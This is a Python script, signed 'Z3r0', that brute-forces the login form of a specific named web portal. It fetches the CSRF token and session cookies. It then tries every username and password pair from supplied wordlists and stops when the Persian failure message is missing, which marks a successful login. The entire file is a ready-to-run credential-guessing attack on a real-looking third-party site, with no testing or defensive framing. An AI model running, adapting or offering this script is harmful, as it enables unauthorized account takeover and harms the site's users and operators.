# -*- coding: utf-8 -*-
import sys
import requests
import os
import optparse
import re
from BeautifulSoup import BeautifulSoup
from colorama import Fore, Back, Style
#import time
from matplotlib import pyplot as plt

url = 'http://ecd-co.ir/portal'



def csrfBG():
	try:
		csrfRes = requests.get(url , timeout=30)
	except Exception as e:
		print (Fore.RED + 'Failed, Try Again\n'+str(e) + Style.RESET_ALL)
		sys.exit()
	soup = BeautifulSoup(csrfRes.text)
	token = soup("input", {"name": "csrfmiddlewaretoken"})[0]["value"]
	cstok = re.search("csrftoken=(.*?);", csrfRes.headers["set-cookie"])
	cstok = cstok.group(1)
	sessiID = re.search("sessionid=(.*?);", csrfRes.headers["set-cookie"])
	sessiID = sessiID.group(1)
	return token , cstok , sessiID


def ReqBody(user,passw):
	CSRFtoken , ctok , sessionID = csrfBG()
	data = {
		'username' : user,
		'password' : passw,
		'csrfmiddlewaretoken' : CSRFtoken
	}
	cookie = {
		'csrftoken' : ctok,
		'sessionid' : sessionID
	}
	try:
		reqRsp = requests.post(url , data=data , cookies=cookie , allow_redirects=False , timeout=30)
	except Exception as e:
		print (Fore.RED + 'Failed, Try Again\n'+str(e) + Style.RESET_ALL)
		sys.exit()
	return reqRsp.text


def Ebrute(ulst,plst,dlay):
	uname = []
	pname = []
	ulst = open(ulst , 'r')
	plst = open(plst , 'r')
	for line in ulst.readlines()[0:]:
		uname.append(line)      # for ENCODING problem use ' unicode(line , 'utf-8-sig') ' instead of line
	for line in plst.readlines()[0:]:
		pname.append(line)      # for ENCODING problem use ' unicode(line , 'utf-8-sig') ' instead of line
	print (Fore.YELLOW + 'Total requests with specified files will be '+ str((len(uname) * len(pname))))
	for ucount in range(len(uname)):
		for pcount in range(len(pname)):
			print (Fore.GREEN + 'Request[%s,%s]\nUsername:%sPassword:%s' % (ucount , pcount , uname[ucount] , pname[pcount]))
			attempt = ReqBody(uname[ucount],pname[pcount])
			checkK = re.compile(ur'گذرواژه یا تلفن همراه نادرست است' , re.UNICODE)
			#checkK = '(403)'
			if (not re.search(checkK,attempt)):
				print (Fore.CYAN + 'Successfull attempt:\nUsername : %sPassword : %s' % (uname[ucount] , pname[pcount]))
				sys.exit()
			else:
				pass
			#time.sleep(float(delay))
			plt.pause(float(dlay))
	ulst.close()
	plst.close()


if __name__=='__main__':
	print (Fore.YELLOW + '\n\tECDco Login BruteForcer')
	print (Fore.CYAN + '			coded by Z3r0\n\n')
	print(Fore.YELLOW)
	parser = optparse.OptionParser()
	parser.add_option('--ul', action='store', dest='ulist' , help='usernames list path')
	parser.add_option('--pl', action='store', dest='plist' , help='passwords list path')
	parser.add_option('--dt', action='store', dest='dtime' , help='delay time between each request')
	print(Style.RESET_ALL)
	options,_ = parser.parse_args()
	if (options.ulist and options.plist):
		if(options.dtime):
			Ebrute(options.ulist,options.plist,options.dtime)
		else:
			Ebrute(options.ulist,options.plist,3)   # default delay = 3 seconds
	else:
		parser.print_help()
		sys.exit()
